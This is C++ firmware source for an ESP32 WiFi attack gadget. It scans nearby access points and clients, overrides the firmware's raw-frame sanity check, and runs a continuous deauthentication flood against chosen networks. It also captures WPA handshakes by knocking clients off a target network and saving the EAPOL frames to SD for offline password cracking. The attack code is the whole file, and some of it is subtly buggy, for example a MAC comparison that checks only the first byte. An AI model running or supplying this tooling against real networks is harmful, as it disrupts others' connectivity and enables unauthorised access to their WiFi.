#include <TFT_eSPI.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "globals.h"

wifi *wifi::instance = nullptr;
bool wifi::deauthing = false;
bool wifi::beaconCloning = false;
bool wifi::WPACapturing = false;

/***************************************************************************************
** Function name: init
** Description:   Initializes WiFi module and sets mode to station mode
***************************************************************************************/

void wifi::init()
{
  instance = this;
  WiFi.mode(WIFI_STA);
}

//-------------------------------------------------------------------------------------

/***************************************************************************************
** Function name: scanAps
** Description:   Starts scanning for nearby WiFi access points
** by enabling promiscuous mode
***************************************************************************************/

void wifi::scanAps()
{
  scanAp = true;
  firstApScan = true;
  apList.clear();
  WiFi.mode(WIFI_STA);
  wifi_promiscuous_filter_t filter = {
      .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};
  esp_timer_create_args_t timerArgs = {
      .callback = &channelHopCallback,
      .arg = this,
      .name = "channel_hop"};
  ESP_ERROR_CHECK(esp_timer_create(&timerArgs, &channelHopperTimer));
  ESP_ERROR_CHECK(esp_timer_start_periodic(channelHopperTimer, 200000));
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&beaconCallbackAp);
  esp_wifi_set_promiscuous(true);
}

/***************************************************************************************
** Function name: beaconCallbackAp
** Description:   Handles received beacon frames and extracts SSID, RSSI, channel,
**                BSSID, and encryption type for each detected WiFi access point
***************************************************************************************/

void wifi::beaconCallbackAp(void *buf, wifi_promiscuous_pkt_type_t type)
{
  if (type != WIFI_PKT_MGMT)
    return;
  auto *sniffer = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *frame = sniffer->payload;
  if (frame[0] != 0x80)
    return;
  uint8_t channel = sniffer->rx_ctrl.channel;
  int rssi = sniffer->rx_ctrl.rssi;
  const uint8_t *bssid = &frame[10];
  uint8_t ssidLen = frame[37];
  String ssid = String((const char *)&frame[38], ssidLen);
  if (ssid.isEmpty())
    return;
  String encryption = "Open";
  uint16_t capabilities = frame[34] | (frame[35] << 8);
  bool privacy = capabilities & (1 << 4);
  if (privacy)
  {
    encryption = "WEP/WPA";
    int pos = 38 + ssidLen;
    int frameLen = sniffer->rx_ctrl.sig_len;
    while (pos + 2 <= frameLen)
    {
      uint8_t id = frame[pos];
      uint8_t len = frame[pos + 1];
      if (pos + 2 + len > frameLen)
        break;
      if (id == 0x30)
      {
        encryption = "WPA2/3";
        break;
      }
      if (id == 0xDD && len >= 4 &&
          frame[pos + 2] == 0x00 && frame[pos + 3] == 0x50 && frame[pos + 4] == 0xF2)
      {
        encryption = "WPA";
        break;
      }
      pos += 2 + len;
    }
  }
  std::lock_guard<std::mutex> lock(instance->apMutex);
  bool exists = false;
  for (const auto &ap : instance->apList)
  {
    if (ap.ssid == ssid && memcmp(ap.bssid.data(), bssid, 6) == 0)
    {
      exists = true;
      break;
    }
  }
  if (!exists && ssid != "")
  {
    Serial.printf("%s (RSSI: %d dBm, ENC: %s)\n", ssid.c_str(), rssi, encryption.c_str());
    AccessPoint newAp;
    newAp.ssid = ssid;
    memcpy(newAp.bssid.data(), bssid, 6);
    newAp.channel = channel;
    newAp.rssi = rssi;
    newAp.encryption = encryption;
    newAp.isDeauthSelected = false;
    newAp.isBecCloneSelected = false;
    newAp.isWPACaptureSelected = false;
    instance->apList.push_back(newAp);
    menu.setRenderState(true);
  }
}

//--------------------------------------------------------------------------------------

/***************************************************************************************
** Function name: scanSts
** Description:   Starts scanning for WiFi stations (clients) using promiscuous mode
***************************************************************************************/

void wifi::scanSts()
{
  scanSt = true;
  firstApScan = true;
  stList.clear();
  wifi_promiscuous_filter_t filter = {
      .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT};
  esp_timer_create_args_t timerArgs = {
      .callback = &channelHopCallback,
      .arg = this,
      .name = "channel_hop"};
  ESP_ERROR_CHECK(esp_timer_create(&timerArgs, &channelHopperTimer));
  ESP_ERROR_CHECK(esp_timer_start_periodic(channelHopperTimer, 200000));
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&beaconCallbackSt);
  esp_wifi_set_promiscuous(true);
}

/***************************************************************************************
** Function name: beaconCallbackSt
** Description:   Processes captured data and management frames to identify WiFi stations
***************************************************************************************/

void wifi::beaconCallbackSt(void *buf, wifi_promiscuous_pkt_type_t type)
{
  if (!instance || !instance->scanSt)
    return;
  auto *sniffer = (wifi_promiscuous_pkt_t *)buf;
  const wifi_pkt_rx_ctrl_t *ctrl = &sniffer->rx_ctrl;
  const uint8_t *frame = sniffer->payload;
  Station newSt;
  newSt.channel = ctrl->channel;
  newSt.rssi = ctrl->rssi;
  if (type == WIFI_PKT_DATA)
  {
    memcpy(newSt.mac.data(), frame + 4, 6);
    memcpy(newSt.bssid.data(), frame + 16, 6);
  }
  else if (type == WIFI_PKT_MGMT && frame[0] == 0x40)
  {
    memcpy(newSt.mac.data(), frame + 10, 6);
    memset(newSt.bssid.data(), 0, 6);
  }
  newSt.isBecCloneSelected = false;
  std::lock_guard<std::mutex> lock(instance->stMutex);
  bool exists = false;
  for (const auto &st : instance->stList)
  {
    if (memcmp(st.mac.data(), newSt.mac.data(), 6) == 0)
    {
      exists = true;
      break;
    }
  }
  if (!exists)
  {
    instance->stList.push_back(newSt);
    menu.setRenderState(true);
  }
}

//--------------------------------------------------------------------------------------

/***************************************************************************************
** Function name: stopWifiScan
** Description:   Stops ongoing WiFi scanning and disables promiscuous mode
***************************************************************************************/

void wifi::stopWifiScan()
{
  scanAp = false;
  scanSt = false;
  esp_timer_stop(channelHopperTimer);
  esp_timer_delete(channelHopperTimer);
  esp_wifi_set_promiscuous(false);
}

//--------------------------------------------------------------------------------------

//------------------------------------------------------------------------
//                Scan packet trafic thanks to @SpaceHuhn
//------------------------------------------------------------------------

void wifi::packetSniffer(uint8_t *buf, uint16_t len)
{
}
double wifi::getMultiplicator(long maxRow, long LineVal)
{
  maxVal = 1;
  for (int i = 0; i < maxRow; i++)
  {
    if (val[i] > maxVal)
      maxVal = val[i];
  }
  if (maxVal > LineVal)
    return (double)LineVal / (double)maxVal;
  return 1;
}
void wifi::packetMonitor()
{
}

//------------------------------------------------------------------------

/***************************************************************************************
** Function name: ieee80211_raw_frame_sanity_check
** Description:   Bypass kernel sanity check for raw 802.11 frames so sending deauth
**                frames is allowed (forces check to always succeed by returning 0)
***************************************************************************************/

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
  return 0;
}

//-------------------------------------------------------------------------------------

/***************************************************************************************
** Function name: startDeauth
** Description:   Starts a background task to send deauthentication frames to selected APs
***************************************************************************************/

void wifi::startDeauth()
{
  if (backgroundTask == NULL)
  {
    deauthing = true;
    xTaskCreatePinnedToCore(
        deauthAttack,
        "DeauthTask",
        4096,
        NULL,
        1,
        &backgroundTask,
        1);
  }
}

/***************************************************************************************
** Function name: deauth
** Description:   Continuously sends deauthentication frames to APs marked for deauth
***************************************************************************************/

void wifi::deauthAttack(void *param)
{
  while (deauthing)
  {
    for (auto &ap : instance->apList)
    {
      if (ap.isDeauthSelected)
      {
        Serial.println("deauthing: " + ap.ssid);
        instance->sendDeauthPaket(ap.channel, ap.bssid.data());
      }
    }
    vTaskDelay(100 / portTICK_PERIOD_MS);
  }
  backgroundTask = NULL;
  vTaskDelete(NULL);
}

void wifi::sendDeauthPaket(int ch, uint8_t *bssid)
{
  Serial.println("Sending DeauthPacket");
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, instance->createDeauthPacket(bssid), sizeof(deauthPacket), false);
}

void wifi::stopDeauth()
{
  deauthing = false;
  if (backgroundTask != NULL) {
    vTaskDelete(backgroundTask);
    backgroundTask = NULL;
  }
}

bool wifi::isDeauthing()
{
  return deauthing;
}

/***************************************************************************************
** Function name: createDeauthPacket
** Description:   Fills the deauth packet with the target AP's BSSID
***************************************************************************************/

uint8_t *wifi::createDeauthPacket(uint8_t *bssid)
{
  uint8_t *endPacket = deauthPacket;
  for (int i = 0; i < 6; i++)
  {
    endPacket[10 + i] = endPacket[16 + i] = bssid[i];
  }
  return endPacket;
}

//-------------------------------------------------------------------------------------

void wifi::startWPACapture()
{
  if (backgroundTask == NULL)
  {
    xTaskCreatePinnedToCore(
        WPACapture,
        "WPACaptur",
        4096,
        NULL,
        1,
        &backgroundTask,
        1);
  }
}

void wifi::stopWPACapture()
{
  WPACapturing = false;
  esp_wifi_set_promiscuous(false);
  if (backgroundTask != NULL) {
    vTaskDelete(backgroundTask);
    backgroundTask = NULL;
  }
}

bool wifi::isWPACapturing(){
  return WPACapturing;  
}

void wifi::WPACapture(void *param)
{
  if (!instance->WPACapturing)
  {
    instance->WPACapturing = true;
    Serial.println("Started WPA Capturing");
    Serial.println("Target: " + instance->WPACaptureTarget.ssid + " CH: " + instance->WPACaptureTarget.channel);
    String path = instance->WPACaptureSDLocation + instance->WPACaptureTarget.ssid + ".pcap";
    if(sd.fileExists(path)){
      sd.deleteFile(path);
    }
    sd.createFile(path);


    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    //esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();

    esp_wifi_set_channel(instance->WPACaptureTarget.channel, WIFI_SECOND_CHAN_NONE);
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&wpa_packet_sniffer);
    esp_wifi_set_promiscuous(true);
  }
  while (instance->WPACapturing)
  {
    esp_wifi_set_promiscuous(false);
    for(int i = 0; i < 30; i++){
      instance->sendDeauthPaket(instance->WPACaptureTarget.channel, instance->WPACaptureTarget.bssid.data());
      vTaskDelay(50 / portTICK_PERIOD_MS);
    }
    esp_wifi_set_promiscuous(true);
    vTaskDelay(5000 / portTICK_PERIOD_MS);
  }
}

void wifi::wpa_packet_sniffer(void *buf, wifi_promiscuous_pkt_type_t type)
{
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *data = pkt->payload;
  uint32_t len = pkt->rx_ctrl.sig_len;
  if (len == 0 || len > 512) return;
  const uint8_t *src = data + 10;
  const uint8_t *dst = data + 4;
  if (!instance->macEqual(src, instance->WPACaptureTarget.bssid.data()) && !instance->macEqual(dst, instance->WPACaptureTarget.bssid.data())) return;
  uint16_t fc = data[0] | (data[1] << 8);
  uint8_t type_field = (fc >> 2) & 0x3;
  if (type_field != 2) return;
  if (!instance->isEAPOLPacket(data, len)) return;
  uint8_t replay[8];
  if (!instance->extractReplay(data, len, replay)) return;
  int keyType = instance->getKeyType(data, len);
  instance->WPAKeys[keyType] = true;
  Serial.printf("EAPOL Key-Nr. %d gespeichert len %u src %02x:%02x:%02x:%02x:%02x:%02x\n", keyType + 1, len, src[0],src[1],src[2],src[3],src[4],src[5]);
  sd.writeToFile(instance->WPACaptureSDLocation + instance->WPACaptureTarget.ssid + ".pcap", data, len, false);
  for(bool i : instance->WPAKeys)if(!i)return;
  Serial.printf("Captured handshake src %02x:%02x:%02x:%02x:%02x:%02x\n", src[0],src[1],src[2],src[3],src[4],src[5]);
  esp_wifi_set_promiscuous(false);
  instance->stopWPACapture();
}

/***************************************************************************************
** Function name: setApSelectings
** Description:   Sets the selection state for an AP for deauth or BEC clone mode
***************************************************************************************/

void wifi::setApSelectings(int id, int mode, bool state)
{
  if (mode == 0)
  {
    apList[id].isDeauthSelected = state;
  }
  if (mode == 1)
  {
    apList[id].isBecCloneSelected = state;
  }
  if(mode == 2){
    apList[id].isWPACaptureSelected = state;
    WPACaptureTarget = apList[id];
    WPACaptureTargetSet = true;
  }
}

//-------------------------------------------------------------------------------------

/***************************************************************************************
** Function name: getApList & getStList
** Description:   Returns the current list of detected access points or Stations
***************************************************************************************/

std::vector<AccessPoint> wifi::getApList()
{
  return apList;
}
std::vector<Station> wifi::getStList()
{
  return stList;
}

//-------------------------------------------------------------------------------------

/***************************************************************************************
** Function name: getApDeauthSelects & getStDeauthSelects
** Description:   Counts how many APs or Sts are selected for deauthentication
***************************************************************************************/

int wifi::getApDeauthSelects()
{
  int aps = 0;
  for (auto ap : apList)
  {
    if (ap.isDeauthSelected)
      aps++;
  }
  return aps;
}

int wifi::getStDeauthSelects()
{
  int sts = 0;
  for (auto st : stList)
  {
    if (st.isDeauthSelected)
      sts++;
  }
  return sts;
}

//-------------------------------------------------------------------------------------

std::vector<bool> wifi::getFirstScan()
{
  std::vector<bool> scanns = {firstApScan, firstStScan};
  return scanns;
}

/***************************************************************************************
** Function name: macEqual
** Description:   Compares two MAC addresses for equality
***************************************************************************************/

bool wifi::macEqual(const uint8_t *a, const uint8_t *b)
{
  for (int i = 0; i < 6; i++)
  {
    if (a[i] != b[i])
    {
      return false;
    }
    return true;
  }
}

//-------------------------------------------------------------------------------------

/***************************************************************************************
** Function name: getHdrLen
** Description:   Calculates the header length of a WiFi frame based on frame control flags
***************************************************************************************/

int wifi::getHdrLen(const uint8_t *data, int len)
{
  if (len < 2)
    return 0;
  uint16_t fc = data[0] | (data[1] << 8);
  bool toDS = fc & (1 << 8);
  bool fromDS = fc & (1 << 9);
  bool qos = fc & 0x0080;
  if (toDS && fromDS)
    return 30;
  if (qos)
    return 26;
  return 24;
}

//---------------------------------------------------------------------------------------

bool wifi::isEAPOLPacket(const uint8_t *data, int len)
{
  int hdr = getHdrLen(data, len);
  if (hdr == 0 || len < hdr + 8)
    return false;
  const uint8_t *llc = data + hdr;
  return (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 && llc[6] == 0x88 && llc[7] == 0x8E);
}

bool wifi::extractReplay(const uint8_t *data, int len, uint8_t replay[8])
{
  int hdr = getHdrLen(data, len);
  if (hdr == 0)
    return false;
  const uint8_t *eapol = data + hdr + 8;
  if ((eapol + 15) > (data + len))
    return false;
  const uint8_t *replayPtr = eapol + 7;
  memcpy(replay, replayPtr, 8);
  return true;
}

int wifi::getKeyType(const uint8_t *data, int len)
{
  int hdr = getHdrLen(data, len);
  if (hdr == 0 || len < hdr + 14)
    return -1;
  const uint8_t *eapol = data + hdr + 8;
  uint16_t keyInfo = (eapol[5] << 8) | eapol[6];
  if (!(keyInfo & (1 << 3)))
    return -1;
  bool ack = keyInfo & (1 << 7);
  bool mic = keyInfo & (1 << 8);
  bool install = keyInfo & (1 << 6);
  bool secure = keyInfo & (1 << 9);
  if (ack && !mic && !secure && !install)
    return 0; // Msg1
  if (!ack && mic && !secure && !install)
    return 1; // Msg2
  if (ack && mic && secure && install)
    return 2; // Msg3
  if (!ack && mic && secure && !install)
    return 3; // Msg4
  return -1;
}
